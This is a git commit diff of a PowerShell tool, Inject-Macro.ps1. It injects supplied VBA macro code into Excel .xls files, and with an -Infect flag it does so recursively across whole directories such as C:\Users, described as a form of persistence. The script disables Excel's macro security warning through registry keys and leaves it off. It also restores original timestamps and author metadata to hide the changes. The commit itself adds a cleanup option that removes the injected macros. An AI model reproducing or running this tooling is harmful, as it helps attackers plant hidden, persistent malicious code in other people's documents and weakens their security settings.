c27972ac770d4aa1f443e31d880b4e70c5c45727
Brandan Geise <coldfusion_39@hotmail.com>
2015-10-12 18:33:40 -0400

    Added option to remove injected macros after mass injection

--- Inject-Macro.ps1
+++ Inject-Macro.ps1
@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-Inject VBA macro code into an Excel document.
+Inject VBA macro code into Excel documents.
 
 Author: Brandan [coldfusion]
 License: MIT
@@ -10,9 +10,15 @@ Optional Dependencies: None
 .DESCRIPTION
 Injects the supplied VBA macro code into the specified Excel document.
 
-If the '-Infect' flag is given, the supplied VBA macro code will be injected into all '.xls' Excel documents in the specified '-Excel' directory path.
-Ideally this would be used to establish a low level form of persistence.
-Additionally, the Excel 'Security' registry keys are not re-enabled on exit, which disables Excel's 'Are you sure you want to run this Macro' warning.
+If the '-Infect' flag is given, the supplied VBA macro code will be injected into all '.xls' 
+Excel documents in the specified '-Excel' directory path. Ideally this would be used to establish 
+a low level form of persistence. The Excel 'Security' registry keys are not re-enabled on exit, 
+which disables Excel's 'Are you sure you want to run this Macro' warning. Additionally, all 
+injected Excel documents' full paths are written to 'excel_inject.bak'.
+
+If the '-Clean' flag is given, the injected VBA macro code will be removed from the targeted 
+Excel documents. The 'excel_inject.bak' file, created while running Inject-Macro with'-Infect', 
+must be in the same directory as Inject-Macro.ps1.
 
 The VBA macro code will only be injected into '.xls' Excel documents, not '.xlsx' or '.xlsm'.
 
@@ -23,7 +29,10 @@ Path of the target Excel document or directory path.
 Path of the VBA macro file you want injected into the Excel document.
 
 .PARAMETER Infect
-Inject VBA macro code into all '.xls' Excel documents found in the supplied '-Excel' directory. 
+Inject VBA macro code into all '.xls' Excel documents found in the supplied '-Excel' directory.
+
+.PARAMETER Clean
+Removes the inject VBA macro code from all Excel documents that were injected with the '-Infect' flag. 
 
 .EXAMPLE
 C:\PS> .\Inject-Macro.ps1 -Excel .\Excel.xls -Macro .\Macro.vba
@@ -38,29 +47,36 @@ C:\PS> .\Inject-Macro.ps1 -Excel C:\Users\ -Macro C:\temp\Macro.vba -Infect
 Description
 -----------
 Injects the VBA macro 'Macro.vba' into all '.xls' Excel documents found in 'C:\Users\' recursively.
+
+.EXAMPLE
+C:\PS> .\Inject-Macro.ps1 -Clean
+
+Description
+-----------
+Removes the injected VBA macro from all '.xls' Excel documents found in 'excel_inject.bak'.
 #>
 
 [CmdletBinding()]
 param(
-	[Parameter(Mandatory = $True)]
+	[Parameter(Mandatory = $False)]
 	[String]
 	$Excel,
 
-	[Parameter(Mandatory = $True)]
+	[Parameter(Mandatory = $False)]
 	[String]
 	$Macro,
 
 	[Parameter(Mandatory = $False)]
 	[Switch]
-	$Infect = $False
+	$Infect = $False,
+
+	[Parameter(Mandatory = $False)]
+	[Switch]
+	$Clean = $False
 )
 
 function Inject-Macro {
 	Clear
-
-	# Process Excel and macro file location
-	$Excel = (Resolve-Path $Excel).Path 
-	$Macro = (Resolve-Path $Macro).Path
 
 	# Create Excel objects
 	Add-Type -AssemblyName Microsoft.Office.Interop.Excel
@@ -71,15 +87,100 @@ function Inject-Macro {
 	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
 	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
 
-	$XLS.DisplayAlerts = "wdAlertsNone"
+	$XLS.DisplayAlerts = 'wdAlertsNone'
 	$XLS.DisplayAlerts = $False
 	$XLS.Visible = $False
 	$XLS.ScreenUpdating = $False
 	$XLS.UserControl = $False
 	$XLS.Interactive = $False
 
-	# Inject macro into a single Excel file
-	if ($Infect -eq $False) {
+	# Inject macro into multiple Excel documents
+	if ($Infect -eq $True) {
+		# Process Excel and macro file location
+		$Excel = (Resolve-Path $Excel).Path 
+		$Macro = (Resolve-Path $Macro).Path
+
+		if ((Test-Path $Excel -pathType container) -eq $True) {
+			Write-Host 'Infecting...'
+			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse
+
+			ForEach ($ExcelFile in $ExcelFiles) {
+				try {
+					# Get original document metadata
+					$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
+					$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')
+
+					$Output = $ExcelFile
+
+					# Try to open Excel document with bad password (for password protected documents)
+					$Workbook = $XLS.Workbooks.Open($ExcelFile, $Null, $Null, 1, "")
+					$Author = $Workbook.Author
+					$VBA = $Workbook.VBProject.VBComponents.Add(1)
+					$VBA.CodeModule.AddFromFile($Macro) | Out-Null
+
+					# Save the document
+					$Workbook.Author = $Author
+					$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
+					$XLS.Workbooks.Close()
+
+					# Re-write original document metadata
+					$(Get-Item $ExcelFile).LastAccessTime = $LAT
+					$(Get-Item $ExcelFile).LastWriteTime = $LWT
+
+					# Write to file for clean up
+					$ExcelFile | Add-Content 'excel_inject.bak' 
+
+					Write-Host "Macro sucessfully injected into $ExcelFile"
+				} catch {
+					continue
+				}
+			}
+		} else {
+			Write-Host 'Please provide a valid directory path!' -foregroundcolor red
+			exit
+		}
+
+	# Clean up for -Inject
+	} elseif ($Clean -eq $True) {
+		Get-Content 'excel_inject.bak' | Foreach-Object {
+			$ExcelFile = $_
+
+			# Get original document metadata
+			$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
+			$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')
+
+			$Workbook = $XLS.Workbooks.Open($ExcelFile)
+			$Author = $Workbook.Author
+
+			# Remove VBA macros
+			ForEach ($Module in $Workbook.VBProject.VBComponents) {
+				if ($Module.Name -Like "Module*") {
+					$Workbook.VBProject.VBComponents.Remove($Module)
+				}
+			}
+
+			# Save the document
+			$Workbook.Author = $Author
+			$Workbook.SaveAs("$ExcelFile", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
+			$XLS.Workbooks.Close()
+
+			# Re-write original document metadata
+			$(Get-Item $ExcelFile).LastAccessTime = $LAT
+			$(Get-Item $ExcelFile).LastWriteTime = $LWT
+
+			Write-Host "Macro removed from $ExcelFile"
+
+		}
+			# Enable macro security
+			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
+			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null
+
+	# Inject macro into single Excel document
+	} else {
+		# Process Excel and macro file location
+		$Excel = (Resolve-Path $Excel).Path 
+		$Macro = (Resolve-Path $Macro).Path
+
 		if ((Test-Path $Excel -pathType container) -eq $False) {
 			$Output = $Excel
 			$Workbook = $XLS.Workbooks.Open($Excel)
@@ -87,7 +188,7 @@ function Inject-Macro {
 			$VBA.CodeModule.AddFromFile($Macro) | Out-Null
 
 			# Sanatize document metadata
-			$RemoveMetadata = "Microsoft.Office.Interop.Excel.XlRemoveDocInfoType" -as [type]
+			$RemoveMetadata = 'Microsoft.Office.Interop.Excel.XlRemoveDocInfoType' -as [type]
 			$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 
 
 			# Save the document
@@ -100,40 +201,7 @@ function Inject-Macro {
 
 			Write-Host "Macro sucessfully injected into $Output"
 		} else {
-			Write-Host "Please provide a valid Excel file!" -foregroundcolor red
-			exit
-		}
-
-	# Inject macro into multiple Excel files
-	} else {
-		if ((Test-Path $Excel -pathType container) -eq $True) {
-			Write-Host "Infecting..."
-			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse
-
-			ForEach ($ExcelFile in $ExcelFiles) {
-				# Get original document metadata
-				$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString("M/d/yyyy h:m tt")
-				$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString("M/d/yyyy h:m tt")
-
-				$Output = $ExcelFile
-				$Workbook = $XLS.Workbooks.Open($ExcelFile)
-				$Author = $Workbook.Author
-				$VBA = $Workbook.VBProject.VBComponents.Add(1)
-				$VBA.CodeModule.AddFromFile($Macro) | Out-Null
-
-				# Save the document
-				$Workbook.Author = $Author
-				$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
-				$XLS.Workbooks.Close()
-
-				# Re-write original document metadata
-				$(Get-Item $ExcelFile).LastAccessTime = $LAT
-				$(Get-Item $ExcelFile).LastWriteTime = $LWT
-
-				Write-Host "Macro sucessfully injected into $ExcelFile"
-			}
-		} else {
-			Write-Host "Please provide a valid directory path!" -foregroundcolor red
+			Write-Host 'Please provide a valid Excel file!' -foregroundcolor red
 			exit
 		}
 	}
@@ -147,10 +215,12 @@ function Inject-Macro {
 		kill -name excel
 	}
 
-	if ($Infect -eq $False) {
-		Write-Host "Remember, the injected VBA macro is NOT password protected!" -foregroundcolor red
+	if ($Infect -eq $True) {
+		Write-Host 'All Excel documents have been injected' -foregroundcolor green	
+	} elseif ($Clean -eq $True) {
+		Write-Host 'Injected macros have been removed from all Excel documents' -foregroundcolor green
 	} else {
-		Write-Host "All found Excel files have been injected" -foregroundcolor green
+		Write-Host 'Remember, the injected VBA macro is NOT password protected!' -foregroundcolor red
 	}
 }
 
